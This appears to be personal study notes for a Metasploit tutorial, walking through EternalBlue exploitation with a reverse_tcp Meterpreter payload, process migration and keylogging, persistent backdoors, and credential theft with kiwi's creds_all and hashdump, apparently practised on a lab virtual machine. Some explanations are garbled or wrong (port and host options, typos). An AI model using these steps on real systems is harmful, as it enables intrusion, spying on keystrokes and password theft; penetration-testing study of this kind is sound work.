
Install:

  On kali linux:

  ~$ sudo apt install metasploit-framework

Running:

  ~$ msfdb

Meterpreter:

  This is an abbreviation for metasploit interpreter.

  The meterpreter shell appears represents the front end of the
  payload used for performing actions of the attack stage; keylogging
  for example.

  Searching for modules:

    msf > search eternalBlue

    Looks for exploits pertaining to this vulnerability.

  Using modules:

    msf > use 0

    Uses the first entry of search.

  Listing modules:

    msf > options

    Lists the options relevant to the module.

  Eternal blue remote code execution:

    In the module windows/smb/ms17_010_eternalblue:

    LHOST should be set to the attacking host, the local host; RHOSTS are the targets.

      msf > set RHOSTS 192.168.100.2

    LPORT represents the port to be exploited, RHOSTS represents the port to go through on local host.

    The windows/meterpreter/reverse_tcp path relates to a payload called reverse_tcp.

  Running exploits:

    With a module loaded, write the following command.

      mrf > run

    This will start the meterpreter session.
    
    The shell session should look like the following if successful.
    
      meterpreter >

  Payloads, a clarification:

    The payload is a program set over the network, there's many designed for
    all kinds of scenarios.

    There are two types of payload: staged and single.
  
    A staged payload consists of two main components, a stub loader and a final stage payload.

    When you deliver windows/meterpreter/reverse_tcp for instance, you actually
    send the loader first; when the loader is executed, it will ask the handler
    on the attacker's side to send over the final stage.

    You can think of it as part one and two epoxy resin; both are useless on their
    own, but they work together for an overall result.

    A single stage payload is payload designed to be sent off in one; can be used
    when the target has no network access.

    We create a reverse bind connection that's running on the port of the Kali.

  Keylogging:

    To key log in a meterpreter session, you need to migrate the payload
    to another process ID, to hopefully reduce the chance that the payload gets
    killed by the target operating system.

      meterpreter > migrate <process ID>

    You can list the process IDs by using the PS command:

      meterpreter > ps

      Process list

      ============

        PID Name
        --- ----
        1   Name.exe
        2   Name2.exe
        3   Name3.exe
        ... ...

    Then, start the key scan.

      meterpreter > keyscan_start

      Starting the keystroke sniffer..

    Dump the keyscan.

      meterpreter > keyscan_dump

    You can detect keylogging info particular to a process; set the process ID accordingly.

Back dooring:

  It's often good to leave an easier means of getting back into the system.

  We do this through a persistent backdoor; even when an exploit is patched
  having a backdoor in place will allow you to get back in without credentials.

Password Retrieval (Post Exploit):

  The windows System Account Manager (SAM) is a database file
  used by windows operating systems to store user passwords.

  It hashes these passwords using a hashing formats called 'LM' and 'NTLM'.

  Both have their own distinctions; we can use programs to perform password
  retrieval to attain passwords and decode these hashes in the database.

  Kiwi:

    This decodes windows hashes within a meterpreter session.

    Within a meterpreter session, write the following command:

      meterpreter > load kiwi

    This will load the kiwi extension for usage in the meterpreter session.

      meterpreter > help kiwi

    This will display the commands available to kiki.

    The, the fun part; write the command 'creds_all.'

      meterpreter > creds_all

    This will get all the credentials and decode them; note that a user
    needs to have logged in before this command produces meaningful output.

  Hashdump:

    This dumps the hashes on the windows machine.

      meterpreter > hashdump

    You can then copy the output of this command and paste it to
    a file for a subsequent decoding; john the ripper for example
    could be used.

    From the meterpreter session, move the current session to the background
    via the following.

      meterpreter > bg

    It'll tell you the number of the session, to use when you want to go back.

    Load the hashdump module by writing the following in the metasploit session.

      msf > use post/windows/gather/hashdump

    Then go back to the session prior; in my case it was session one.

      msf > set session 1

    Then, perform the exploit.

      msf > exploit

    Common passwords will be found easily; Pa$$w0rd01 was found for me on the virtual machine.

